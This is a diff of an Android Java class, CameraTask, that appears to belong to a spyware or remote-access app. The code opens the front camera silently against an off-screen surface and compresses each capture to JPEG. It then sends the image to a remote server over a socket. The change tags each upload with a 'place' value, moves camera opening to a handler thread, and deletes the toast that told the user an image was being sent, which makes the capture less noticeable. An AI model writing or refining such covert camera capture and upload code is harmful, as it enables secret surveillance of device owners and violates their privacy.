@@ -9,6 +9,8 @@ import android.graphics.PixelFormat;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.os.AsyncTask;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.util.Log;
 import android.view.SurfaceView;
 import android.widget.Toast;
@@ -27,10 +29,14 @@ import static com.google.android.gms.internal.zzagr.runOnUiThread;
 
 public class CameraTask extends AsyncTask<Void, Void, Void> {
     private Context context;
+    private String place;
     private Socket socket;
+    private Camera camera;
 
-    public CameraTask(Context context, Socket socket) {
+
+    public CameraTask(Context context, String place, Socket socket) {
         this.context = context;
+        this.place = place;
         this.socket = socket;
     }
 
@@ -44,7 +50,7 @@ public class CameraTask extends AsyncTask<Void, Void, Void> {
     {
         SurfaceView surface = new SurfaceView(context);
         SurfaceTexture st = new SurfaceTexture(10);
-        Camera camera = Camera.open(1);
+        newOpenCamera();
         try {
             List<Camera.Size> sizes = camera.getParameters().getSupportedPictureSizes();
             int width = sizes.get(0).width;
@@ -76,8 +82,7 @@ public class CameraTask extends AsyncTask<Void, Void, Void> {
                 realImage.compress(Bitmap.CompressFormat.JPEG, 70, stream);
                 byte[] byteArray = stream.toByteArray();
 
-                socket.emit("image", byteArray);
-                showToast("send image");
+                socket.emit("image", byteArray, place);
             } catch (Exception e) {
 
             } finally {
@@ -106,6 +111,51 @@ public class CameraTask extends AsyncTask<Void, Void, Void> {
                 Toast.makeText(context, text, Toast.LENGTH_SHORT).show();
             }
         });
+    }
+
+    private void newOpenCamera() {
+        if (mThread == null) {
+            mThread = new CameraHandlerThread();
+        }
+
+        synchronized (mThread) {
+            mThread.openCamera();
+        }
+    }
+
+    private CameraHandlerThread mThread = null;
+    private class CameraHandlerThread extends HandlerThread {
+        Handler mHandler = null;
+
+        CameraHandlerThread() {
+            super("CameraHandlerThread");
+            start();
+            mHandler = new Handler(getLooper());
+        }
+
+        synchronized void notifyCameraOpened() {
+            notify();
+        }
+
+        void openCamera() {
+            mHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        camera = Camera.open(1);
+                    }
+                    catch (RuntimeException e) {
+                        Log.e("Camera", "failed to open front camera");
+                    }                    notifyCameraOpened();
+                }
+            });
+            try {
+                wait();
+            }
+            catch (InterruptedException e) {
+                Log.w("Camera", "wait was interrupted");
+            }
+        }
     }
 
 }
